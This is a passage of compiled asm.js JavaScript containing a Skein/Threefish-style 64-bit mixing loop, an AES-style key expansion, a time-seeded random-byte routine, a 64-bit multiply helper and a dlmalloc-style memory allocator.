            S = wb(W | 0, S | 0, l | 0, m | 0) | 0;
            E = y;
            O = wb((_ | Z) ^ U | 0, Y | 0, X | 0, O | 0) | 0;
            X = y;
            V = wb(U | 0, V | 0, K | 0, M | 0) | 0;
            U = y;
            Y = wb(h | 0, i | 0, 17, 0) | 0;
            R = wb(Y | 0, y | 0, (T | Q) ^ W | 0, R | 0) | 0;
            W = y;
            E = wb(S | 0, E | 0, O | 0, X | 0) | 0;
            S = y;
            Q = zb(O | 0, X | 0, 25) | 0;
            T = y;
            X = yb(O | 0, X | 0, 39) | 0;
            X = (Q | X) ^ E;
            T = (T | y) ^ S;
            U = wb(V | 0, U | 0, R | 0, W | 0) | 0;
            V = y;
            Q = zb(R | 0, W | 0, 33) | 0;
            O = y;
            W = yb(R | 0, W | 0, 31) | 0;
            W = (Q | W) ^ U;
            O = (O | y) ^ V;
            S = wb(W | 0, O | 0, E | 0, S | 0) | 0;
            E = y;
            Q = zb(W | 0, O | 0, 46) | 0;
            R = y;
            O = yb(W | 0, O | 0, 18) | 0;
            O = (Q | O) ^ S;
            R = (R | y) ^ E;
            V = wb(X | 0, T | 0, U | 0, V | 0) | 0;
            U = y;
            Q = zb(X | 0, T | 0, 12) | 0;
            W = y;
            T = yb(X | 0, T | 0, 52) | 0;
            T = (Q | T) ^ V;
            W = (W | y) ^ U;
            E = wb(T | 0, W | 0, S | 0, E | 0) | 0;
            S = y;
            Q = zb(T | 0, W | 0, 58) | 0;
            X = y;
            W = yb(T | 0, W | 0, 6) | 0;
            W = (Q | W) ^ E;
            X = (X | y) ^ S;
            U = wb(O | 0, R | 0, V | 0, U | 0) | 0;
            V = y;
            Q = zb(O | 0, R | 0, 22) | 0;
            T = y;
            R = yb(O | 0, R | 0, 42) | 0;
            R = (Q | R) ^ U;
            T = (T | y) ^ V;
            S = wb(R | 0, T | 0, E | 0, S | 0) | 0;
            E = y;
            V = wb(W | 0, X | 0, U | 0, V | 0) | 0;
            U = y;
            Q = wb(S | 0, E | 0, n | 0, o | 0) | 0;
            O = y;
            M = wb(X ^ V | 0, W ^ U | 0, K | 0, M | 0) | 0;
            K = y;
            I = wb(V | 0, U | 0, G | 0, I | 0) | 0;
            G = y;
            U = wb(j | 0, k | 0, 18, 0) | 0;
            E = wb(U | 0, y | 0, T ^ S | 0, R ^ E | 0) | 0;
            h = Q ^ P;
            i = O ^ N;
            N = w;
            c[N >> 2] = h;
            c[N + 4 >> 2] = i;
            j = M ^ L;
            k = K ^ J;
            J = x;
            c[J >> 2] = j;
            c[J + 4 >> 2] = k;
            l = I ^ H;
            m = G ^ F;
            F = z;
            c[F >> 2] = l;
            c[F + 4 >> 2] = m;
            n = E ^ D;
            o = y ^ C;
            C = r;
            c[C >> 2] = n;
            c[C + 4 >> 2] = o;
            q = q & -1073741825;
            e = e + -1 | 0;
            if (!e) break;
            else b = b + 32 | 0
        }
        ha = wb(B | 0, u | 0, s | 0, t | 0) | 0;
        ia = A;
        c[ia >> 2] = ha;
        c[ia + 4 >> 2] = y;
        ia = v;
        c[ia >> 2] = p;
        c[ia + 4 >> 2] = q;
        return
    }

    function Ua(b) {
        b = b | 0;
        var e = 0,
            f = 0,
            g = 0,
            h = 0,
            i = 0,
            j = 0,
            k = 0,
            m = 0,
            n = 0,
            o = 0,
            p = 0,
            q = 0,
            r = 0,
            s = 0,
            t = 0,
            u = 0,
            v = 0,
            w = 0;
        w = l;
        l = l + 16 | 0;
        t = w;
        f = c[b >> 2] | 0;
        u = (c[f >> 2] | 0) >>> 2;
        g = f + 20 | 0;
        c[g >> 2] = u;
        u = u + 7 | 0;
        v = f + 16 | 0;
        c[v >> 2] = u;
        u = u << 4;
        c[f + 8 >> 2] = u;
        u = ab(u, 1) | 0;
        c[f + 12 >> 2] = u;
        Db(u | 0, c[f + 4 >> 2] | 0, c[f >> 2] | 0) | 0;
        g = c[g >> 2] | 0;
        if (g >>> 0 >= c[v >> 2] << 2 >>> 0) {
            l = w;
            return
        }
        r = t + 1 | 0;
        s = t + 3 | 0;
        u = t + 2 | 0;
        p = t + 1 | 0;
        q = t + 2 | 0;
        v = t + 2 | 0;
        e = g;
        o = g;
        while (1) {
            m = c[f + 12 >> 2] | 0;
            n = e << 2;
            f = m + (n + -4) | 0;
            f = d[f >> 0] | d[f + 1 >> 0] << 8 | d[f + 2 >> 0] << 16 | d[f + 3 >> 0] << 24;
            c[t >> 2] = f;
            g = (e >>> 0) % (o >>> 0) | 0;
            h = f >>> 8;
            i = f >>> 16;
            k = f >>> 24;
            if (g)
                if (o >>> 0 > 6 & (g | 0) == 4) {
                    j = a[(f & 15) + (9615 + ((f >>> 4 & 15) << 4)) >> 0] | 0;
                    a[t >> 0] = j;
                    h = a[(h & 15) + (9615 + ((f >>> 12 & 15) << 4)) >> 0] | 0;
                    a[r >> 0] = h;
                    g = a[(i & 15) + (9615 + ((f >>> 20 & 15) << 4)) >> 0] | 0;
                    a[v >> 0] = g;
                    f = a[(k & 15) + (9615 + (f >>> 28 << 4)) >> 0] | 0;
                    a[s >> 0] = f
                } else {
                    j = f & 255;
                    h = h & 255;
                    g = i & 255;
                    f = k & 255
                }
            else {
                Eb(t | 0, r | 0, 3) | 0;
                j = d[t >> 0] | 0;
                a[t >> 0] = a[(j & 15) + (9615 + (j >>> 4 << 4)) >> 0] | 0;
                j = d[r >> 0] | 0;
                a[r >> 0] = a[(j & 15) + (9615 + (j >>> 4 << 4)) >> 0] | 0;
                j = d[u >> 0] | 0;
                a[u >> 0] = a[(j & 15) + (9615 + (j >>> 4 << 4)) >> 0] | 0;
                f = a[(f & 15) + (9615 + ((f >>> 4 & 15) << 4)) >> 0] | 0;
                a[s >> 0] = f;
                j = a[9871 + (((e >>> 0) / (o >>> 0) | 0) + -1) >> 0] ^ a[t >> 0];
                a[t >> 0] = j;
                h = a[p >> 0] | 0;
                g = a[q >> 0] | 0
            }
            a[m + n >> 0] = j ^ a[m + (e - o << 2) >> 0];
            o = c[b >> 2] | 0;
            m = c[o + 12 >> 2] | 0;
            a[m + (n | 1) >> 0] = h ^ a[m + (e - (c[o + 20 >> 2] | 0) << 2 | 1) >> 0];
            m = c[b >> 2] | 0;
            o = c[m + 12 >> 2] | 0;
            a[o + (n | 2) >> 0] = g ^ a[o + (e - (c[m + 20 >> 2] | 0) << 2 | 2) >> 0];
            o = c[b >> 2] | 0;
            g = c[o + 12 >> 2] | 0;
            a[g + (n | 3) >> 0] = f ^ a[g + (e - (c[o + 20 >> 2] | 0) << 2 | 3) >> 0];
            e = e + 1 | 0;
            g = c[b >> 2] | 0;
            if (e >>> 0 >= c[g + 16 >> 2] << 2 >>> 0) break;
            f = g;
            o = c[g + 20 >> 2] | 0
        }
        l = w;
        return
    }

    function Va(a, b, d) {
        a = a | 0;
        b = b | 0;
        d = d | 0;
        var e = 0,
            f = 0;
        e = c[a >> 2] | 0;
        if (e | 0) {
            f = c[e + 4 >> 2] | 0;
            if (f) {
                $a(f);
                c[(c[a >> 2] | 0) + 4 >> 2] = 0;
                e = c[a >> 2] | 0
            }
            f = c[e + 12 >> 2] | 0;
            if (f) {
                $a(f);
                c[(c[a >> 2] | 0) + 12 >> 2] = 0;
                e = c[a >> 2] | 0
            }
            $a(e);
            c[a >> 2] = 0
        }
        e = ab(24, 1) | 0;
        c[a >> 2] = e;
        c[e >> 2] = d;
        f = ab(d, 1) | 0;
        c[e + 4 >> 2] = f;
        Db(f | 0, b | 0, d | 0) | 0;
        Ua(a);
        return 0
    }

    function Wa() {
        var a = 0,
            b = 0,
            d = 0,
            f = 0,
            g = 0,
            h = 0,
            i = 0,
            j = 0,
            k = 0,
            m = 0,
            n = 0;
        f = l;
        l = l + 16 | 0;
        a = f;
        d = ab(24, 1) | 0;
        if (!d) {
            d = 0;
            l = f;
            return d | 0
        }
        ja(a | 0) | 0;
        n = _(a | 0) | 0;
        j = e[a + 4 >> 1] | 0;
        b = ab(1, j) | 0;
        m = c[n + 20 >> 2] | 0;
        k = c[n + 16 >> 2] | 0;
        i = c[n + 12 >> 2] | 0;
        h = c[n + 8 >> 2] | 0;
        g = c[n + 4 >> 2] | 0;
        a = c[n >> 2] | 0;
        a = j + 1901 + m + k + (b + j) + i + h + g + a + (nb() | 0) | 0;
        if (b | 0) $a(b);
        sb(a);
        c[d >> 2] = 0;
        Xa(d, 2, 0) | 0;
        n = d;
        l = f;
        return n | 0
    }

    function Xa(c, d, e) {
        c = c | 0;
        d = d | 0;
        e = e | 0;
        var f = 0,
            g = 0,
            h = 0;
        if (!c) {
            d = 2;
            return d | 0
        }
        a: do switch (d << 16 >> 16) {
                case 1:
                    {
                        h = c + 4 | 0;f = b[h >> 1] & -3;b[h >> 1] = f;c = c + 6 | 0;b[c >> 1] = 0;b[c + 2 >> 1] = 0;b[c + 4 >> 1] = 0;b[c + 6 >> 1] = 0;b[c + 8 >> 1] = 0;b[c + 10 >> 1] = 0;b[c + 12 >> 1] = 0;b[c + 14 >> 1] = 0;c = h;
                        break
                    }
                case 2:
                    {
                        h = c + 4 | 0;f = b[h >> 1] & -2;b[h >> 1] = f;g = c + 6 | 0;
                        if (!e) {
                            a[g >> 0] = tb() | 0;
                            a[c + 7 >> 0] = tb() | 0;
                            a[c + 8 >> 0] = tb() | 0;
                            a[c + 9 >> 0] = tb() | 0;
                            a[c + 10 >> 0] = tb() | 0;
                            a[c + 11 >> 0] = tb() | 0;
                            a[c + 12 >> 0] = tb() | 0;
                            a[c + 13 >> 0] = tb() | 0;
                            a[c + 14 >> 0] = tb() | 0;
                            a[c + 15 >> 0] = tb() | 0;
                            a[c + 16 >> 0] = tb() | 0;
                            a[c + 17 >> 0] = tb() | 0;
                            a[c + 18 >> 0] = tb() | 0;
                            a[c + 19 >> 0] = tb() | 0;
                            a[c + 20 >> 0] = tb() | 0;
                            a[c + 21 >> 0] = tb() | 0;
                            c = h;
                            f = b[h >> 1] | 0;
                            break a
                        } else {
                            c = e;
                            e = g + 16 | 0;
                            do {
                                a[g >> 0] = a[c >> 0] | 0;
                                g = g + 1 | 0;
                                c = c + 1 | 0
                            } while ((g | 0) < (e | 0));
                            c = h;
                            break a
                        }
                    }
                default:
                    {
                        d = 3;
                        return d | 0
                    }
            }
            while (0);
            b[c >> 1] = f | d;
        d = 0;
        return d | 0
    }

    function Ya(a) {
        a = a | 0;
        var b = 0,
            d = 0,
            e = 0;
        if (!a) {
            a = 2;
            return a | 0
        }
        b = c[a >> 2] | 0;
        if (!b) {
            a = 0;
            return a | 0
        }
        d = c[b >> 2] | 0;
        if (d) {
            e = c[d + 4 >> 2] | 0;
            if (e) {
                $a(e);
                c[(c[b >> 2] | 0) + 4 >> 2] = 0;
                d = c[b >> 2] | 0
            }
            e = c[d + 12 >> 2] | 0;
            if (e) {
                $a(e);
                c[(c[b >> 2] | 0) + 12 >> 2] = 0;
                d = c[b >> 2] | 0
            }
            $a(d);
            c[b >> 2] = 0;
            b = c[a >> 2] | 0
        }
        $a(b);
        c[a >> 2] = 0;
        a = 0;
        return a | 0
    }

    function Za(a, b, d, e, f) {
        a = a | 0;
        b = b | 0;
        d = d | 0;
        e = e | 0;
        f = f | 0;
        var g = 0,
            h = 0,
            i = 0,
            j = 0,
            k = 0,
            l = 0;
        l = Bb(e | 0, 0, b | 0, 0) | 0;
        k = y;
        g = Bb(d | 0, 0, b | 0, 0) | 0;
        i = y;
        j = Bb(e | 0, 0, a | 0, 0) | 0;
        h = y;
        b = Bb(d | 0, 0, a | 0, 0) | 0;
        a = y;
        h = wb(g | 0, i | 0, j | 0, h | 0) | 0;
        j = y;
        e = wb(0, h | 0, b | 0, a | 0) | 0;
        d = y;
        k = wb(j | 0, 0, l | 0, k | 0) | 0;
        g = wb(k | 0, y | 0, 0, (j >>> 0 < i >>> 0 | (j | 0) == (i | 0) & h >>> 0 < g >>> 0) & 1 | 0) | 0;
        b = wb(g | 0, y | 0, (d >>> 0 < a >>> 0 | (d | 0) == (a | 0) & e >>> 0 < b >>> 0) & 1 | 0, 0) | 0;
        c[f >> 2] = b;
        c[f + 4 >> 2] = y;
        y = d;
        return e | 0
    }

    function _a(a) {
        a = a | 0;
        var b = 0,
            d = 0,
            e = 0,
            f = 0,
            g = 0,
            h = 0,
            i = 0,
            j = 0,
            k = 0,
            m = 0,
            n = 0,
            o = 0,
            p = 0,
            q = 0,
            r = 0,
            s = 0,
            t = 0,
            u = 0,
            v = 0,
            w = 0,
            x = 0;
        x = l;
        l = l + 16 | 0;
        o = x;
        do
            if (a >>> 0 < 245) {
                k = a >>> 0 < 11 ? 16 : a + 11 & -8;
                a = k >>> 3;
                n = c[2474] | 0;
                d = n >>> a;
                if (d & 3 | 0) {
                    b = (d & 1 ^ 1) + a | 0;
                    a = 9936 + (b << 1 << 2) | 0;
                    d = a + 8 | 0;
                    e = c[d >> 2] | 0;
                    f = e + 8 | 0;
                    g = c[f >> 2] | 0;
                    if ((a | 0) == (g | 0)) c[2474] = n & ~(1 << b);
                    else {
                        c[g + 12 >> 2] = a;
                        c[d >> 2] = g
                    }
                    w = b << 3;
                    c[e + 4 >> 2] = w | 3;
                    w = e + w + 4 | 0;
                    c[w >> 2] = c[w >> 2] | 1;
                    w = f;
                    l = x;
                    return w | 0
                }
                m = c[2476] | 0;
                if (k >>> 0 > m >>> 0) {
                    if (d | 0) {
                        b = 2 << a;
                        b = d << a & (b | 0 - b);
                        b = (b & 0 - b) + -1 | 0;
                        h = b >>> 12 & 16;
                        b = b >>> h;
                        d = b >>> 5 & 8;
                        b = b >>> d;
                        f = b >>> 2 & 4;
                        b = b >>> f;
                        a = b >>> 1 & 2;
                        b = b >>> a;
                        e = b >>> 1 & 1;
                        e = (d | h | f | a | e) + (b >>> e) | 0;
                        b = 9936 + (e << 1 << 2) | 0;
                        a = b + 8 | 0;
                        f = c[a >> 2] | 0;
                        h = f + 8 | 0;
                        d = c[h >> 2] | 0;
                        if ((b | 0) == (d | 0)) {
                            a = n & ~(1 << e);
                            c[2474] = a
                        } else {
                            c[d + 12 >> 2] = b;
                            c[a >> 2] = d;
                            a = n
                        }
                        g = (e << 3) - k | 0;
                        c[f + 4 >> 2] = k | 3;
                        e = f + k | 0;
                        c[e + 4 >> 2] = g | 1;
                        c[e + g >> 2] = g;
                        if (m | 0) {
                            f = c[2479] | 0;
                            b = m >>> 3;
                            d = 9936 + (b << 1 << 2) | 0;
                            b = 1 << b;
                            if (!(a & b)) {
                                c[2474] = a | b;
                                b = d;
                                a = d + 8 | 0
                            } else {
                                a = d + 8 | 0;
                                b = c[a >> 2] | 0
                            }
                            c[a >> 2] = f;
                            c[b + 12 >> 2] = f;
                            c[f + 8 >> 2] = b;
                            c[f + 12 >> 2] = d
                        }
                        c[2476] = g;
                        c[2479] = e;
                        w = h;
                        l = x;
                        return w | 0
                    }
                    i = c[2475] | 0;
                    if (i) {
                        d = (i & 0 - i) + -1 | 0;
                        h = d >>> 12 & 16;
                        d = d >>> h;
                        g = d >>> 5 & 8;
                        d = d >>> g;
                        j = d >>> 2 & 4;
                        d = d >>> j;
                        e = d >>> 1 & 2;
                        d = d >>> e;
                        a = d >>> 1 & 1;
                        a = c[10200 + ((g | h | j | e | a) + (d >>> a) << 2) >> 2] | 0;
                        d = (c[a + 4 >> 2] & -8) - k | 0;
                        e = c[a + 16 + (((c[a + 16 >> 2] | 0) == 0 & 1) << 2) >> 2] | 0;
                        if (!e) {
                            j = a;
                            g = d
                        } else {
                            do {
                                h = (c[e + 4 >> 2] & -8) - k | 0;
                                j = h >>> 0 < d >>> 0;
                                d = j ? h : d;
                                a = j ? e : a;
                                e = c[e + 16 + (((c[e + 16 >> 2] | 0) == 0 & 1) << 2) >> 2] | 0
                            } while ((e | 0) != 0);
                            j = a;
                            g = d
                        }
                        h = j + k | 0;
                        if (j >>> 0 < h >>> 0) {
                            f = c[j + 24 >> 2] | 0;
                            b = c[j + 12 >> 2] | 0;
                            do
                                if ((b | 0) == (j | 0)) {
                                    a = j + 20 | 0;
                                    b = c[a >> 2] | 0;
                                    if (!b) {
                                        a = j + 16 | 0;
                                        b = c[a >> 2] | 0;
                                        if (!b) {
                                            d = 0;
                                            break
                                        }
                                    }
                                    while (1) {
                                        d = b + 20 | 0;
                                        e = c[d >> 2] | 0;
                                        if (e | 0) {
                                            b = e;
                                            a = d;
                                            continue
                                        }
                                        d = b + 16 | 0;
                                        e = c[d >> 2] | 0;
                                        if (!e) break;
                                        else {
                                            b = e;
                                            a = d
                                        }
                                    }
                                    c[a >> 2] = 0;
                                    d = b
                                } else {
                                    d = c[j + 8 >> 2] | 0;
                                    c[d + 12 >> 2] = b;
                                    c[b + 8 >> 2] = d;
                                    d = b
                                }
                            while (0);
                            do
                                if (f | 0) {
                                    b = c[j + 28 >> 2] | 0;
                                    a = 10200 + (b << 2) | 0;
                                    if ((j | 0) == (c[a >> 2] | 0)) {
                                        c[a >> 2] = d;
                                        if (!d) {
                                            c[2475] = i & ~(1 << b);
                                            break
                                        }
                                    } else {
                                        c[f + 16 + (((c[f + 16 >> 2] | 0) != (j | 0) & 1) << 2) >> 2] = d;
                                        if (!d) break
                                    }
                                    c[d + 24 >> 2] = f;
                                    b = c[j + 16 >> 2] | 0;
                                    if (b | 0) {
                                        c[d + 16 >> 2] = b;
                                        c[b + 24 >> 2] = d
                                    }
                                    b = c[j + 20 >> 2] | 0;
                                    if (b | 0) {
                                        c[d + 20 >> 2] = b;
                                        c[b + 24 >> 2] = d
                                    }
                                }
                            while (0);
                            if (g >>> 0 < 16) {
                                w = g + k | 0;
                                c[j + 4 >> 2] = w | 3;
                                w = j + w + 4 | 0;
                                c[w >> 2] = c[w >> 2] | 1
                            } else {
                                c[j + 4 >> 2] = k | 3;
                                c[h + 4 >> 2] = g | 1;
                                c[h + g >> 2] = g;
                                if (m | 0) {
                                    e = c[2479] | 0;
                                    b = m >>> 3;
                                    d = 9936 + (b << 1 << 2) | 0;
                                    b = 1 << b;
                                    if (!(n & b)) {
                                        c[2474] = n | b;
                                        b = d;
                                        a = d + 8 | 0
                                    } else {
                                        a = d + 8 | 0;
                                        b = c[a >> 2] | 0
                                    }
                                    c[a >> 2] = e;
                                    c[b + 12 >> 2] = e;
                                    c[e + 8 >> 2] = b;
                                    c[e + 12 >> 2] = d
                                }
                                c[2476] = g;
                                c[2479] = h
                            }
                            w = j + 8 | 0;
                            l = x;
                            return w | 0
                        } else n = k
                    } else n = k
                } else n = k
            } else if (a >>> 0 <= 4294967231) {
            a = a + 11 | 0;
            k = a & -8;
            j = c[2475] | 0;
            if (j) {
                e = 0 - k | 0;
                a = a >>> 8;
                if (a)
                    if (k >>> 0 > 16777215) i = 31;
                    else {
                        n = (a + 1048320 | 0) >>> 16 & 8;
                        v = a << n;
                        m = (v + 520192 | 0) >>> 16 & 4;
                        v = v << m;
                        i = (v + 245760 | 0) >>> 16 & 2;
                        i = 14 - (m | n | i) + (v << i >>> 15) | 0;
                        i = k >>> (i + 7 | 0) & 1 | i << 1
                    }
                else i = 0;
                d = c[10200 + (i << 2) >> 2] | 0;
                a: do
                    if (!d) {
                        d = 0;
                        a = 0;
                        v = 57
                    } else {
                        a = 0;
                        h = k << ((i | 0) == 31 ? 0 : 25 - (i >>> 1) | 0);
                        g = 0;
                        while (1) {
                            f = (c[d + 4 >> 2] & -8) - k | 0;
                            if (f >>> 0 < e >>> 0)
                                if (!f) {
                                    a = d;
                                    e = 0;
                                    f = d;
                                    v = 61;
                                    break a
                                } else {
                                    a = d;
                                    e = f
                                }
                            f = c[d + 20 >> 2] | 0;
                            d = c[d + 16 + (h >>> 31 << 2) >> 2] | 0;
                            g = (f | 0) == 0 | (f | 0) == (d | 0) ? g : f;
                            f = (d | 0) == 0;
                            if (f) {
                                d = g;
                                v = 57;
                                break
                            } else h = h << ((f ^ 1) & 1)
                        }
                    }
                while (0);
                if ((v | 0) == 57) {
                    if ((d | 0) == 0 & (a | 0) == 0) {
                        a = 2 << i;
                        a = j & (a | 0 - a);
                        if (!a) {
                            n = k;
                            break
                        }
                        n = (a & 0 - a) + -1 | 0;
                        h = n >>> 12 & 16;
                        n = n >>> h;
                        g = n >>> 5 & 8;
                        n = n >>> g;
                        i = n >>> 2 & 4;
                        n = n >>> i;
                        m = n >>> 1 & 2;
                        n = n >>> m;
                        d = n >>> 1 & 1;
                        a = 0;
                        d = c[10200 + ((g | h | i | m | d) + (n >>> d) << 2) >> 2] | 0
                    }
                    if (!d) {
                        i = a;
                        h = e
                    } else {
                        f = d;
                        v = 61
                    }
                }
                if ((v | 0) == 61)
                    while (1) {
                        v = 0;
                        d = (c[f + 4 >> 2] & -8) - k | 0;
                        n = d >>> 0 < e >>> 0;
                        d = n ? d : e;
                        a = n ? f : a;
                        f = c[f + 16 + (((c[f + 16 >> 2] | 0) == 0 & 1) << 2) >> 2] | 0;
                        if (!f) {
                            i = a;
                            h = d;
                            break
                        } else {
                            e = d;
                            v = 61
                        }
                    }
                if ((i | 0) != 0 ? h >>> 0 < ((c[2476] | 0) - k | 0) >>> 0 : 0) {
                    g = i + k | 0;
                    if (i >>> 0 >= g >>> 0) {
                        w = 0;
                        l = x;
                        return w | 0
                    }
                    f = c[i + 24 >> 2] | 0;
                    b = c[i + 12 >> 2] | 0;
                    do
                        if ((b | 0) == (i | 0)) {
                            a = i + 20 | 0;
                            b = c[a >> 2] | 0;
                            if (!b) {
                                a = i + 16 | 0;
                                b = c[a >> 2] | 0;
                                if (!b) {
                                    b = 0;
                                    break
                                }
                            }
                            while (1) {
                                d = b + 20 | 0;
                                e = c[d >> 2] | 0;
                                if (e | 0) {
                                    b = e;
                                    a = d;
                                    continue
                                }
                                d = b + 16 | 0;
                                e = c[d >> 2] | 0;
                                if (!e) break;
                                else {
                                    b = e;
                                    a = d
                                }
                            }
                            c[a >> 2] = 0
                        } else {
                            w = c[i + 8 >> 2] | 0;
                            c[w + 12 >> 2] = b;
                            c[b + 8 >> 2] = w
                        }
                    while (0);
                    do
                        if (f) {
                            a = c[i + 28 >> 2] | 0;
                            d = 10200 + (a << 2) | 0;
                            if ((i | 0) == (c[d >> 2] | 0)) {
                                c[d >> 2] = b;
                                if (!b) {
                                    e = j & ~(1 << a);
                                    c[2475] = e;
                                    break
                                }
                            } else {
                                c[f + 16 + (((c[f + 16 >> 2] | 0) != (i | 0) & 1) << 2) >> 2] = b;
                                if (!b) {
                                    e = j;
                                    break
                                }
                            }
                            c[b + 24 >> 2] = f;
                            a = c[i + 16 >> 2] | 0;
                            if (a | 0) {
                                c[b + 16 >> 2] = a;
                                c[a + 24 >> 2] = b
                            }
                            a = c[i + 20 >> 2] | 0;
                            if (a) {
                                c[b + 20 >> 2] = a;
                                c[a + 24 >> 2] = b;
                                e = j
                            } else e = j
                        } else e = j; while (0);
                    do
                        if (h >>> 0 >= 16) {
                            c[i + 4 >> 2] = k | 3;
                            c[g + 4 >> 2] = h | 1;
                            c[g + h >> 2] = h;
                            b = h >>> 3;
                            if (h >>> 0 < 256) {
                                d = 9936 + (b << 1 << 2) | 0;
                                a = c[2474] | 0;
                                b = 1 << b;
                                if (!(a & b)) {
                                    c[2474] = a | b;
                                    b = d;
                                    a = d + 8 | 0
                                } else {
                                    a = d + 8 | 0;
                                    b = c[a >> 2] | 0
                                }
                                c[a >> 2] = g;
                                c[b + 12 >> 2] = g;
                                c[g + 8 >> 2] = b;
                                c[g + 12 >> 2] = d;
                                break
                            }
                            b = h >>> 8;
                            if (b)
                                if (h >>> 0 > 16777215) b = 31;
                                else {
                                    v = (b + 1048320 | 0) >>> 16 & 8;
                                    w = b << v;
                                    u = (w + 520192 | 0) >>> 16 & 4;
                                    w = w << u;
                                    b = (w + 245760 | 0) >>> 16 & 2;
                                    b = 14 - (u | v | b) + (w << b >>> 15) | 0;
                                    b = h >>> (b + 7 | 0) & 1 | b << 1
                                }
                            else b = 0;
                            d = 10200 + (b << 2) | 0;
                            c[g + 28 >> 2] = b;
                            a = g + 16 | 0;
                            c[a + 4 >> 2] = 0;
                            c[a >> 2] = 0;
                            a = 1 << b;
                            if (!(e & a)) {
                                c[2475] = e | a;
                                c[d >> 2] = g;
                                c[g + 24 >> 2] = d;
                                c[g + 12 >> 2] = g;
                                c[g + 8 >> 2] = g;
                                break
                            }
                            a = h << ((b | 0) == 31 ? 0 : 25 - (b >>> 1) | 0);
                            d = c[d >> 2] | 0;
                            while (1) {
                                if ((c[d + 4 >> 2] & -8 | 0) == (h | 0)) {
                                    v = 97;
                                    break
                                }
                                e = d + 16 + (a >>> 31 << 2) | 0;
                                b = c[e >> 2] | 0;
                                if (!b) {
                                    v = 96;
                                    break
                                } else {
                                    a = a << 1;
                                    d = b
                                }
                            }
                            if ((v | 0) == 96) {
                                c[e >> 2] = g;
                                c[g + 24 >> 2] = d;
                                c[g + 12 >> 2] = g;
                                c[g + 8 >> 2] = g;
                                break
                            } else if ((v | 0) == 97) {
                                v = d + 8 | 0;
                                w = c[v >> 2] | 0;
                                c[w + 12 >> 2] = g;
                                c[v >> 2] = g;
                                c[g + 8 >> 2] = w;
                                c[g + 12 >> 2] = d;
                                c[g + 24 >> 2] = 0;
                                break
                            }
                        } else {
                            w = h + k | 0;
                            c[i + 4 >> 2] = w | 3;
                            w = i + w + 4 | 0;
                            c[w >> 2] = c[w >> 2] | 1
                        }
                    while (0);
                    w = i + 8 | 0;
                    l = x;
                    return w | 0
                } else n = k
            } else n = k
        } else n = -1;
        while (0);
        d = c[2476] | 0;
        if (d >>> 0 >= n >>> 0) {
            b = d - n | 0;
            a = c[2479] | 0;
            if (b >>> 0 > 15) {
                w = a + n | 0;
                c[2479] = w;
                c[2476] = b;
                c[w + 4 >> 2] = b | 1;
                c[w + b >> 2] = b;
                c[a + 4 >> 2] = n | 3
            } else {
                c[2476] = 0;
                c[2479] = 0;
                c[a + 4 >> 2] = d | 3;
                w = a + d + 4 | 0;
                c[w >> 2] = c[w >> 2] | 1
            }
            w = a + 8 | 0;
            l = x;
            return w | 0
        }
        h = c[2477] | 0;
        if (h >>> 0 > n >>> 0) {
            u = h - n | 0;
            c[2477] = u;
            w = c[2480] | 0;
            v = w + n | 0;
            c[2480] = v;
            c[v + 4 >> 2] = u | 1;
            c[w + 4 >> 2] = n | 3;
            w = w + 8 | 0;
            l = x;
            return w | 0
        }
        if (!(c[2592] | 0)) {
            c[2594] = 4096;
            c[2593] = 4096;
            c[2595] = -1;
            c[2596] = -1;
            c[2597] = 0;
            c[2585] = 0;
            a = o & -16 ^ 1431655768;
            c[o >> 2] = a;
            c[2592] = a;
            a = 4096
        } else a = c[2594] | 0;
        i = n + 48 | 0;
        j = n + 47 | 0;
        g = a + j | 0;
        f = 0 - a | 0;
        k = g & f;
        if (k >>> 0 <= n >>> 0) {
            w = 0;
            l = x;
            return w | 0
        }
        a = c[2584] | 0;
        if (a | 0 ? (m = c[2582] | 0, o = m + k | 0, o >>> 0 <= m >>> 0 | o >>> 0 > a >>> 0) : 0) {
            w = 0;
            l = x;
            return w | 0
        }
        b: do
            if (!(c[2585] & 4)) {
                d = c[2480] | 0;
                c: do
                    if (d) {
                        e = 10344;
                        while (1) {
                            a = c[e >> 2] | 0;
                            if (a >>> 0 <= d >>> 0 ? (r = e + 4 | 0, (a + (c[r >> 2] | 0) | 0) >>> 0 > d >>> 0) : 0) break;
                            a = c[e + 8 >> 2] | 0;
                            if (!a) {
                                v = 118;
                                break c
                            } else e = a
                        }
                        b = g - h & f;
                        if (b >>> 0 < 2147483647) {
                            a = Cb(b | 0) | 0;
                            if ((a | 0) == ((c[e >> 2] | 0) + (c[r >> 2] | 0) | 0)) {
                                if ((a | 0) != (-1 | 0)) {
                                    h = b;
                                    g = a;
                                    v = 135;
                                    break b
                                }
                            } else {
                                e = a;
                                v = 126
                            }
                        } else b = 0
                    } else v = 118; while (0);
                do
                    if ((v | 0) == 118) {
                        d = Cb(0) | 0;
                        if ((d | 0) != (-1 | 0) ? (b = d, p = c[2593] | 0, q = p + -1 | 0, b = ((q & b | 0) == 0 ? 0 : (q + b & 0 - p) - b | 0) + k | 0, p = c[2582] | 0, q = b + p | 0, b >>> 0 > n >>> 0 & b >>> 0 < 2147483647) : 0) {
                            r = c[2584] | 0;
                            if (r | 0 ? q >>> 0 <= p >>> 0 | q >>> 0 > r >>> 0 : 0) {
                                b = 0;
                                break
                            }
                            a = Cb(b | 0) | 0;
                            if ((a | 0) == (d | 0)) {
                                h = b;
                                g = d;
                                v = 135;
                                break b
                            } else {
                                e = a;
                                v = 126
                            }
                        } else b = 0
                    }
                while (0);
                do
                    if ((v | 0) == 126) {
                        d = 0 - b | 0;
                        if (!(i >>> 0 > b >>> 0 & (b >>> 0 < 2147483647 & (e | 0) != (-1 | 0))))
                            if ((e | 0) == (-1 | 0)) {
                                b = 0;
                                break
                            } else {
                                h = b;
                                g = e;
                                v = 135;
                                break b
                            }
                        a = c[2594] | 0;
                        a = j - b + a & 0 - a;
                        if (a >>> 0 >= 2147483647) {
                            h = b;
                            g = e;
                            v = 135;
                            break b
                        }
                        if ((Cb(a | 0) | 0) == (-1 | 0)) {
                            Cb(d | 0) | 0;
                            b = 0;
                            break
                        } else {
                            h = a + b | 0;
                            g = e;
                            v = 135;
                            break b
                        }
                    }
                while (0);
                c[2585] = c[2585] | 4;
                v = 133
            } else {
                b = 0;
                v = 133
            }
        while (0);
        if (((v | 0) == 133 ? k >>> 0 < 2147483647 : 0) ? (u = Cb(k | 0) | 0, r = Cb(0) | 0, s = r - u | 0, t = s >>> 0 > (n + 40 | 0) >>> 0, !((u | 0) == (-1 | 0) | t ^ 1 | u >>> 0 < r >>> 0 & ((u | 0) != (-1 | 0) & (r | 0) != (-1 | 0)) ^ 1)) : 0) {
            h = t ? s : b;
            g = u;
            v = 135
        }
